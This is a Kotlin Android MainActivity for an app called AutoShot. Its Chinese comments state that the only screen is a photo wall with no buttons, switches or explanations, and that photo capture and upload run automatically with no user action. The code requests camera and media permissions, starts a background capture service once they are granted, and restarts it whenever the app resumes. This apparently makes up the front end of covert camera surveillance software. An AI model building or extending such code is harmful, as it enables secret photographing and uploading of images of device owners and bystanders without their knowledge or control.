package com.autoshot.app.ui

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import androidx.lifecycle.viewmodel.compose.viewModel
import com.autoshot.app.camera.CaptureService
import com.autoshot.app.ui.theme.AutoShotTheme

/**
 * 前端只有一个界面：本机相册照片墙。
 * 没有任何按钮、开关、说明文字；拍摄与上传全部自动，用户无需任何点击。
 * 唯一会出现在界面上的系统 UI 是权限授权框。
 */
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            AutoShotTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background,
                ) {
                    PhotoWall()
                }
            }
        }
    }
}

/** 没有这些权限，拍摄/相册功能无法工作 */
private fun blockingPermissions(): List<String> {
    val list = mutableListOf(Manifest.permission.CAMERA)
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        list += Manifest.permission.READ_MEDIA_IMAGES
    } else {
        list += Manifest.permission.READ_EXTERNAL_STORAGE
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
        // Android 14+ 部分授权，不申明会反复弹选择器
        list += Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
    }
    return list
}

/** 可选权限：被拒也不影响采集与展示 */
private fun optionalPermissions(): List<String> =
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        listOf(Manifest.permission.POST_NOTIFICATIONS)
    } else {
        emptyList()
    }

private fun requiredPermissions(): List<String> = blockingPermissions() + optionalPermissions()

private fun missingPermissions(context: Context): List<String> =
    requiredPermissions().filter {
        ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
    }

private fun missingBlocking(context: Context): List<String> =
    blockingPermissions().filter {
        ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
    }

@Composable
private fun PhotoWall() {
    val context = LocalContext.current
    val galleryVm: GalleryViewModel = viewModel()

    var missing by remember { mutableStateOf(missingPermissions(context)) }

    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        missing = missingPermissions(context)
        if (missingBlocking(context).isEmpty()) CaptureService.start(context)
    }

    // 关键权限（相机/相册）齐全就自动开始拍摄循环；缺就只弹系统授权框
    LaunchedEffect(missing) {
        if (missingBlocking(context).isEmpty()) {
            CaptureService.start(context)
        } else {
            permissionLauncher.launch(missing.toTypedArray())
        }
    }

    // 从后台回来时补一次启动（服务被杀后能自愈），并刷新权限状态
    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                val now = missingPermissions(context)
                missing = now
                if (missingBlocking(context).isEmpty()) CaptureService.start(context)
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    Box(Modifier.fillMaxSize()) {
        GalleryScreen(galleryVm)
    }
}
